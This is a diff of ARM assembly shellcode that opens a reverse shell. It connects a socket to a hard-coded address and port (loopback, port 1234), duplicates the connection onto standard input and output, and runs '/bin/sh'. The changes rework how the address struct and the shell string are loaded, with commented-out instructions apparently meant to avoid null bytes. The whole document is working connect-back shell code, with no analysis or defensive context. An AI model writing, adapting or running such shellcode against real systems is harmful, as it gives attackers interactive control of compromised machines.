@@ -21,10 +21,15 @@ _start:
     svc    1
   
     // connect(s, &sa, sizeof(sa));
-    mov    r6, r0      // r6 = s
-    add    r1, pc, #32 // r1 = &sa
-    mov    r2, #16     // r2 = sizeof(sa)
-    add    r7, #2      // r7 = 281+2 = connect
+    mov    r6, r0       // r6 = s
+    ldr    r1, sin_port // r1 = sa.sin_port
+    //mvn    r1, r1
+    ldr    r2, sin_addr // r2 = sa.sin_addr
+    //mvn    r2, r2
+    push   {r1, r2}
+    mov    r1, sp       // r1 = &sa
+    mov    r2, #16      // r2 = sizeof(sa)
+    add    r7, #2       // r7 = 281+2 = connect
     svc    1
   
     // dup(s, FILENO_STDIN);
@@ -39,7 +44,7 @@ dup_loop:
     bpl    dup_loop
 
     // execve("/bin/sh", {"/bin/sh", NULL}, NULL);
-    add    r0, pc, #20   // r0 = "/bin/sh" 
+    adr    r0, sh        // r0 = "/bin/sh" 
     eor    r2, r2, r2    // r2 = NULL
     eor    r1, r1, r1    // r1 = NULL
     // push {r0, r2}      // "/bin/sh", NULL
@@ -48,8 +53,11 @@ dup_loop:
     svc    1
     nop
     nop
+sin_port:    
 .word  0xd2040002
-.word  0x0100007f  
+sin_addr:
+.word  0x0100007f
+sh:  
 .ascii "/bin/sh"
 
 
